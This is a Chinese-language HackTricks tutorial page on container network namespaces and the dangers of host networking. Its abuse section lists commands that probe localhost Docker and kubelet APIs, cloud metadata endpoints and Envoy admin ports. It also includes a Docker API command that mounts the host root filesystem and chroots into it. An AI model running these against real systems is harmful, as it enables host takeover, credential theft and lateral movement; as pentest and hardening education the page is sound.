# 网络命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

网络命名空间隔离与网络相关的资源，例如接口、IP 地址、路由表、ARP/neighbor 状态、防火墙规则、sockets、UNIX-domain 抽象 socket 命名空间，以及 `/proc/net` 等文件的内容。这就是为什么 container 可以拥有看起来属于自己的 `eth0`、本地路由和 loopback 设备，却不必拥有 host 的真实网络栈。

从安全角度来看，这一点很重要，因为网络隔离远不只是限制端口绑定。私有网络命名空间会限制 workload 能够直接观察或重新配置的内容。一旦该命名空间与 host 共享，container 可能会突然获得对 host listeners、host-local services、抽象 AF_UNIX endpoints 以及原本不应向 application 暴露的网络控制点的可见性。

## 操作

新创建的网络命名空间在接口连接到其中之前，会处于网络环境为空或几乎为空的状态。随后，container runtimes 会创建或连接 virtual interfaces、分配地址并配置路由，使 workload 获得预期的 connectivity。在基于 bridge 的部署中，这通常意味着 container 会看到一个连接到 host bridge、由 veth 支持的接口。在 Kubernetes 中，CNI plugins 负责处理等效的 Pod networking 设置。

这种架构解释了为什么 `--network=host` 或 `hostNetwork: true` 会带来如此巨大的变化。workload 不再获得预先配置好的私有网络栈，而是加入 host 的实际网络栈。

## 实验

你可以使用以下命令查看一个几乎为空的网络命名空间：
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
你还可以使用以下方式比较普通容器和使用主机网络的容器：
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
host-networked container 不再拥有自己独立的 socket 和 interface 视图。仅这一变化就已经非常重要，更不用说进程还拥有哪些 capabilities。

## Runtime 使用

除非进行其他配置，Docker 和 Podman 通常会为每个 container 创建独立的 network namespace。Kubernetes 通常会为每个 Pod 分配自己的 network namespace，该 namespace 由 Pod 内的 containers 共享，但与 host 分离。这意味着 `127.0.0.1` 通常是 Pod-local，而不是 container-local：一个 container 中仅绑定到 localhost 的 listener，通常可以被其 sidecars 和同 Pod 中的其他 containers 访问。Incus/LXC 系统同样提供基于 network namespace 的丰富隔离机制，通常支持更多种类的虚拟网络配置。

其共同原则是：private networking 是默认的隔离边界，而 host networking 则是显式退出该边界。

## 配置错误

最重要的配置错误就是直接共享 host network namespace。有时这样做是为了性能、低级别监控或方便，但它会移除 container 可用的最清晰边界之一。Host-local listeners 会以更直接的方式变得可访问，仅限 localhost 的 services 可能因此暴露，而 `CAP_NET_ADMIN` 或 `CAP_NET_RAW` 等 capabilities 也会变得更加危险，因为它们所启用的操作现在会作用于 host 自身的网络环境。

即使 network namespace 是 private，过度授予网络相关 capabilities 也是另一个问题。private namespace 确实能够提供帮助，但它并不会让 raw sockets 或高级网络控制变得无害。

在 Kubernetes 中，`hostNetwork: true` 还会改变你对 Pod-level network segmentation 的信任程度。Kubernetes 文档指出，许多 network plugins 无法在进行 `podSelector` / `namespaceSelector` 匹配时正确区分 `hostNetwork` Pod 的流量，因此会将其视为普通 node 流量。从攻击者的角度来看，这意味着被攻陷的 `hostNetwork` workload 通常应被视为 node-level network foothold，而不是仍然受到与 overlay-network workloads 相同 policy 假设约束的普通 Pod。

## Abuse

在隔离较弱的环境中，攻击者可能会检查 host 上正在监听的 services，访问仅绑定到 loopback 的 management endpoints，根据具体 capabilities 和环境 sniff 或干扰流量，或者在存在 `CAP_NET_ADMIN` 时重新配置 routing 和 firewall 状态。在 cluster 中，这还可能使 lateral movement 和 control-plane reconnaissance 变得更加容易。

如果怀疑使用了 host networking，应首先确认可见的 interfaces 和 listeners 属于 host，而不是属于隔离的 container network：
```bash
ip addr
ip route
ss -lntup | head -n 50
```
仅限 Loopback 的服务通常是第一个值得关注的发现：
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
抽象 UNIX sockets 是另一个容易被忽略的目标，因为它们受 network namespace 作用域限制，尽管它们看起来不像 TCP/UDP listeners，并且可能不会作为 `/run` 下的文件系统路径存在。因此，使用 host network 的 container 可能继承对仅限 host 使用的控制通道的访问权限，即使这些通道根本没有被 bind-mount 到 container 中：
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
一个历史案例是 `containerd-shim` 抽象 socket 暴露漏洞，但其更广泛的教训比具体的 CVE 更重要：一旦 workload 加入 host network namespace，抽象 AF_UNIX 服务也会成为攻击面的一部分。如果这些 socket 看起来与 runtime 或管理功能相关，请转向 [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md)。

如果存在 network capabilities，请测试 workload 是否能够检查或修改可见的 network stack：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
在现代内核中，host networking 加上 `CAP_NET_ADMIN` 可能还会通过超出简单 `iptables` / `nftables` 修改范围的方式暴露数据包路径。`tc` qdiscs 和 filters 也按 namespace 进行隔离，因此在共享 host network namespace 中，它们会作用于容器能够看到的主机接口。如果同时存在 `CAP_BPF`，则与网络相关的 eBPF 程序（例如 TC 和 XDP loaders）也会成为相关因素：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
这很重要，因为攻击者可能能够在主机接口层面镜像、重定向、调整或丢弃流量，而不仅仅是重写防火墙规则。在私有 network namespace 中，这些操作仅限于容器视图；而在共享的主机 namespace 中，它们会影响主机。

在集群或云环境中，主机网络还使得快速本地侦察 metadata 和邻近 control plane 的服务变得合理：
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
在 Kubernetes 中，请记住，攻陷多容器 Pod 中的**任意**一个 container，也可以访问由同一 Pod 中的 sibling containers 和 sidecars 打开的 localhost listeners，因为整个 Pod 共享同一个 network namespace。当使用 service-mesh、observability 和 helper containers 时，这一点尤其重要，因为它们的管理或调试接口通常会被有意限制在 Pod 内部，而不是面向整个 cluster：
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
将“绑定到 localhost”视为 **Pod-private**，而不是 **container-private**。Pod 中的一个 container 被攻陷后，这个假设就不再成立。

### 完整示例：主机网络 + 本地 Runtime / Kubelet 访问

主机网络不会自动提供主机 root 权限，但它通常会暴露一些原本只允许从节点自身访问的服务。如果其中某个服务的保护措施较弱，主机网络就会成为直接的 privilege-escalation 路径。

localhost 上的 Docker API：
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost 上的 Kubelet：
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影响：

- 如果本地 runtime API 在未受到适当保护的情况下暴露，可能直接导致 host compromise
- 如果 kubelet 或本地 agents 可访问，可能进行 cluster reconnaissance 或 lateral movement
- 与 `CAP_NET_ADMIN` 结合时，可能进行 traffic manipulation 或造成 denial of service

## 检查

这些检查旨在确认进程是否拥有私有 network stack、可见哪些 routes 和 listeners，以及在测试 capabilities 之前，当前 network view 是否已经呈现出类似 host 的特征。
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
这里值得注意的是：

- 如果 `/proc/self/ns/net` 和 `/proc/1/ns/net` 看起来已经类似于 host，那么该 container 可能正在共享 host 的 network namespace，或使用了其他非私有 namespace。
- 当 shell 已经位于某个命名或持久化 namespace 中，并且你希望将其与 host 侧 `/run/netns` 中的对象进行关联时，`lsns -t net` 和 `ip netns identify` 非常有用。
- `ss -lntup` 尤其有价值，因为它可以显示仅绑定到 loopback 的 listener 以及本地管理 endpoint。`ss -xap` 和 `/proc/net/unix` 则可以补充 abstract socket 视图，发现普通文件系统 socket 检查可能遗漏的内容。
- 如果存在 `CAP_NET_ADMIN`、`CAP_NET_RAW` 或 `CAP_BPF`，路由、interface 名称、firewall 上下文、`tc` 状态以及 eBPF attachment 会变得更加重要。
- 在 Kubernetes 中，来自 `hostNetwork` Pod 的 service-name 解析失败，可能只是因为该 Pod 没有使用 `dnsPolicy: ClusterFirstWithHostNet`，而不代表 service 不存在。
- 在 multi-container Pod 中，localhost listener 属于整个 Pod 的 network namespace。因此，在认定某个仅限 loopback 的端口无法从被 compromise 的 container 访问之前，应先检查 sidecar 和 sibling container。

检查 container 时，始终要将 network namespace 与 capability set 一起评估。host networking 加上强大的 network capabilities，与 bridge networking 加上精简的默认 capability set，代表着完全不同的安全态势。

## References

- [Kubernetes NetworkPolicy 和 `hostNetwork` 的注意事项](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` 与 abstract UNIX socket 隔离](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory：向 host-network container 暴露 abstract Unix domain socket](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [网络相关 eBPF program 的 eBPF token 和 capability 要求](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
